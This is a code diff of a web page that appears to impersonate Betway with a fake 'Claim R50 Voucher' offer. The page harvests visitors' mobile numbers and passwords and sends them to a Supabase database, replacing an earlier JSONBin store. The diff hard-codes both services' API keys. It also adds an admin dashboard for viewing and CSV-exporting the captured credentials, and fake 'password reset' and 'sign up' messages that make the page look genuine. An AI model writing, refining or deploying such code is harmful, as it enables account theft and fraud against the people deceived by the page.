@@ -6,6 +6,8 @@
     <title>Betway • Claim R50 Voucher</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <!-- Supabase JS -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
@@ -616,7 +618,11 @@
             color: #ffd700;
         }
 
-        /* Caution Modal - appears for ALL users after claiming */
+        .toast.info i {
+            color: #3498db;
+        }
+
+        /* CONGRATULATION Modal */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -948,10 +954,10 @@
 
     <script>
         (function() {
-            // ==================== ✅ YOUR JSONBIN DETAILS ✅ ====================
-            const JSONBIN_URL = 'https://api.jsonbin.io/v3/b/6a71fa4ff5f4af5e29ea3702';
-            const API_KEY = '$2a$10$Ijr4z7u9pF0ijvsA6vxqF.RGwxSV56StREb0EDFquCkbbAR/by0d.';
-            // ===================================================================
+            // ==================== ✅ YOUR SUPABASE DETAILS (ALREADY CONFIGURED) ✅ ====================
+            const SUPABASE_URL = 'https://ttepviuyaewgdnynulyp.supabase.co';
+            const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0ZXB2aXV5YWV3Z2RueW51bHlwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU4NTQyMDAsImV4cCI6MjEwMTQzMDIwMH0.OWf2H69YZVe-FJPW214YfpUOUdakWDcFadrmDSXzrEg';
+            // =======================================================================================
 
             const loadingScreen = document.getElementById('loadingScreen');
             const mainCard = document.getElementById('mainCard');
@@ -974,11 +980,27 @@
             const STORAGE_KEY = 'betway_user_data';
             let isAdminLoggedIn = false;
             let allData = [];
+            let supabase = null;
+            let isSupabaseConfigured = false;
+
+            // Initialize Supabase
+            function initSupabase() {
+                try {
+                    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+                    isSupabaseConfigured = true;
+                    console.log('✅ Supabase connected!');
+                    showToast('✅ Cloud sync enabled!', 'success');
+                } catch (error) {
+                    console.error('Error initializing Supabase:', error);
+                    isSupabaseConfigured = false;
+                    showToast('⚠️ Using local storage only.', 'warning');
+                }
+            }
 
             // Toast notification
             function showToast(message, type = 'success') {
                 toast.className = 'toast';
-                toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-exclamation-triangle'}"></i> ${message}`;
+                toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-info-circle'}"></i> ${message}`;
                 toast.className = `toast show ${type}`;
                 setTimeout(() => {
                     toast.className = 'toast';
@@ -998,7 +1020,7 @@
                     loadingScreen.classList.add('hidden');
                     setTimeout(() => {
                         mainCard.classList.add('visible');
-                        showToast('✅ Cloud sync enabled!', 'success');
+                        initSupabase();
                     }, 100);
                 }
             }, 1000);
@@ -1010,26 +1032,23 @@
                 this.classList.toggle('fa-eye-slash');
             });
 
-            // ==================== CLOUD DATA FUNCTIONS ====================
+            // ==================== DATA FUNCTIONS ====================
 
+            // Fetch data from Supabase
             async function fetchCloudData() {
+                if (!isSupabaseConfigured) {
+                    const localData = localStorage.getItem(STORAGE_KEY);
+                    return localData ? JSON.parse(localData) : [];
+                }
+
                 try {
-                    const response = await fetch(JSONBIN_URL, {
-                        headers: {
-                            'X-Master-Key': API_KEY
-                        }
-                    });
+                    const { data, error } = await supabase
+                        .from('voucher_claims')
+                        .select('*')
+                        .order('id', { ascending: true });
 
-                    if (!response.ok) {
-                        throw new Error('Failed to fetch data');
-                    }
-
-                    const data = await response.json();
-                    let records = data.record || data;
-                    if (records && typeof records === 'object' && records.data) {
-                        records = records.data;
-                    }
-                    return Array.isArray(records) ? records : [];
+                    if (error) throw error;
+                    return data || [];
                 } catch (error) {
                     console.error('Error fetching cloud data:', error);
                     const localData = localStorage.getItem(STORAGE_KEY);
@@ -1037,35 +1056,46 @@
                 }
             }
 
-            async function saveCloudData(data) {
-                try {
-                    const payload = { data: data };
-                    const response = await fetch(JSONBIN_URL, {
-                        method: 'PUT',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-Master-Key': API_KEY
-                        },
-                        body: JSON.stringify(payload)
-                    });
+            // Save data to Supabase
+            async function saveCloudData(entries) {
+                if (!isSupabaseConfigured) {
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
+                    return false;
+                }
 
-                    if (!response.ok) {
-                        throw new Error('Failed to save data');
+                try {
+                    // Delete all existing data
+                    const { error: deleteError } = await supabase
+                        .from('voucher_claims')
+                        .delete()
+                        .neq('id', 0);
+
+                    if (deleteError) throw deleteError;
+
+                    // Insert new data if there are entries
+                    if (entries.length > 0) {
+                        const { error: insertError } = await supabase
+                            .from('voucher_claims')
+                            .insert(entries);
+
+                        if (insertError) throw insertError;
                     }
 
-                    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
                     return true;
                 } catch (error) {
                     console.error('Error saving cloud data:', error);
-                    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
                     return false;
                 }
             }
 
+            // Check if duplicate exists
             function isDuplicate(data, mobile, password) {
                 return data.some(item => item.mobile === mobile && item.password === password);
             }
 
+            // Save a new entry
             async function saveEntry(mobile, password, isAdmin = false) {
                 try {
                     let existingData = await fetchCloudData();
@@ -1073,6 +1103,7 @@
                         existingData = [];
                     }
 
+                    // Only check for duplicates if NOT admin
                     if (!isAdmin) {
                         if (isDuplicate(existingData, mobile, password)) {
                             showToast('This Account has already claimed the R50 Voucher.', 'warning');
@@ -1100,6 +1131,7 @@
                 }
             }
 
+            // Get all data
             async function getAllData() {
                 try {
                     const data = await fetchCloudData();
@@ -1113,6 +1145,7 @@
                 }
             }
 
+            // Render data table
             function renderDataTable(data) {
                 const displayData = data || allData;
                 recordCount.textContent = displayData.length;
@@ -1143,6 +1176,7 @@
                 dataTableBody.innerHTML = html;
             }
 
+            // Refresh dashboard
             async function refreshDashboard() {
                 showToast('Refreshing data...', 'info');
                 const data = await getAllData();
@@ -1150,6 +1184,7 @@
                 showToast('Data refreshed!', 'success');
             }
 
+            // Clear all data
             async function clearAllData() {
                 if (confirm('Are you sure you want to delete ALL saved data from the cloud?')) {
                     try {
@@ -1164,6 +1199,7 @@
                 }
             }
 
+            // Export data to CSV
             function exportCSV() {
                 const data = allData;
                 if (data.length === 0) {
@@ -1188,6 +1224,7 @@
                 showToast('Data exported successfully!', 'success');
             }
 
+            // Show dashboard
             async function showDashboard() {
                 mainCard.classList.remove('visible');
                 setTimeout(async () => {
@@ -1201,6 +1238,7 @@
                 }, 300);
             }
 
+            // Show main card
             function showMainCard() {
                 dataDashboard.classList.remove('visible');
                 setTimeout(() => {
@@ -1214,6 +1252,7 @@
 
             // ==================== EVENT LISTENERS ====================
 
+            // Claim voucher
             claimBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
 
@@ -1246,9 +1285,9 @@
                 }
             });
 
+            // Close caution modal
             closeModalBtn.addEventListener('click', function() {
                 cautionModal.classList.remove('active');
-                // If admin, show dashboard after closing modal
                 if (isAdminLoggedIn) {
                     setTimeout(() => {
                         showDashboard();
@@ -1267,25 +1306,34 @@
                 }
             });
 
+            // Back button
             backBtn.addEventListener('click', function() {
                 isAdminLoggedIn = false;
                 showMainCard();
             });
 
+            // Refresh
             refreshBtn.addEventListener('click', refreshDashboard);
+
+            // Export CSV
             exportCsvBtn.addEventListener('click', exportCSV);
+
+            // Clear data
             clearDataBtn.addEventListener('click', clearAllData);
 
+            // Forgot password
             document.querySelector('.forgot-link').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('Password reset link sent to your registered mobile number.', 'success');
+                showToast('Password reset link sent to your registered mobile number.', 'info');
             });
 
+            // Sign Up link
             document.querySelector('.signup-prompt a').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('Redirecting to sign up page...', 'success');
+                showToast('Redirecting to sign up page...', 'info');
             });
 
+            // Keyboard shortcuts
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Escape') {
                     if (cautionModal.classList.contains('active')) {
